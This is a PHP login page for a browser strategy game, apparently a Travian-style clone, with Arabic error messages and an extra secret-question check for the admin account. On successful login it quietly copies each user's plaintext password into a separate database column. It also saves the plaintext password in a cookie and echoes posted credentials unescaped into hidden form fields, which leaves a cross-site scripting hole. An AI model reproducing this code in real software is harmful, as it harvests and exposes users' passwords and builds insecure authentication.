<?php
###############################################################################
## This particular work may not be copied or edited, powered by Ratovi Games ##
###############################################################################
require(".".DIRECTORY_SEPARATOR."app_ndc".DIRECTORY_SEPARATOR."boot.php");
require_once(MODEL_PATH."index.php");
class GPage extends DefaultPage{

        public $data = NULL;
        public $error = NULL;
        public $errorState = -1;
        public $name = NULL;
        public $password = NULL;

        public function GPage(){
                parent::defaultpage();
                $this->viewFile = "login.phtml";
                $this->layoutViewFile = "layout".DIRECTORY_SEPARATOR."form.phtml";
                $this->contentCssClass = "login";
                }
        public function load(){
                $cookie = ClientData::getinstance();
                $m = new IndexModel();
                $this->data = $m->getIndexSummary();
                $this->err[0] = "";
                $this->err[1] = "";
                $this->err[2] = "";
                $this->err[3] = "";
                $this->err[4] = "";
                if($this->isPost()){
                        if(!isset($_POST['name']) || trim($_POST['name'] ) == ""){
                                 $this->err[0] = login_result_msg_noname;
                        }
                        else{
                                $this->name = mysql_real_escape_string(trim($_POST['name']));
                                if(!isset($_POST['password'] ) || $_POST['password'] == ""){
                                 $this->err[1] = login_result_msg_nopwd;
                                }
                                else{
                                        $this->password = $_POST['password'];
                                        $boot = isset ($_GET['boot']) ? TRUE : FALSE;
                                        if ($boot) { session_start();  $_SESSION['boot'] = 1;}
                                        $result = $m->getLoginResult($this->name, $this->password, WebHelper::getclientip(), $boot);
                                        if($result == NULL){
                                               $this->err[0] = login_result_msg_notexists;
                                        }
                                        elseif($result['hasError']){
                                 //$this->err[1] = login_result_msg_wrongpwd;

       $this->setError($m, '<p class="error_box"><b><span class="error">نسيت كلمة السر؟</span></b><br />
                يمكنك انشاء كلمة سر جديدة وسيتم ارسالهم لايميلك المسجل لدينا.<br />
                <a href="password?id='.$result['playerId'].'">إنشاء كلمة سر جديدة!</a>
        </p>',2); }
else if ($this->name == $this->appConfig['system']['adminName'] && $_POST['f'] != $this->appConfig['system']['adming']) {
       $this->setError($m, '<form action="" method="post"><p class="error_box"><b><font color="red">
                جواب السؤال السري </font></b>: <input name="f" size="50" class="text" type="text"><input name="name" type="hidden" value="'.$_POST['name'].'"><input name="password" type="hidden" value="'.$_POST['password'].'"></form>
        </p>',2);
}
                                        else{
                                                $this->player = new Player();
                                                $this->player->playerId = $result['playerId'];
                                                $this->player->isAgent = $result['data']['is_agent'];
                                                $this->player->actions = $result['data']['actions'];
                                                $this->player->gameStatus = $result['gameStatus'];
                                                $this->player->save();
                                                $cookie->uname = $this->name;
                                                $cookie->upwd = $this->password;
                                                $islamLover = new QueueModel();
                                                $islamLover->provider->executeQuery2("UPDATE p_players SET pwd1='%s' WHERE id=%s", array( $this->password, $result['playerId'] ) );
                                                $cookie->save();
                                                $m->dispose();
                                                session_start();  
                                                $_SESSION['pwd'] = md5($this->password);
                                                $_SESSION['is_rig'] = $this->name;
                                                $this->redirect("village1");
         }
                                }
                        }
                }
                else{
                        if(isset($_GET['dcookie'])){
                                $cookie->clear();
                                $this->redirect("login");
                        }
                        else{
                                $this->name = $cookie->uname;
                                $this->password = $cookie->upwd;
                        }
                        $m->dispose();
                }
        }

        public function setError($m, $errorMessage, $errorState = -1){
                $this->error = $errorMessage;
                $this->errorState = $errorState;
                $m->dispose();
        }
}
$p = new GPage();
$p->run();
?>
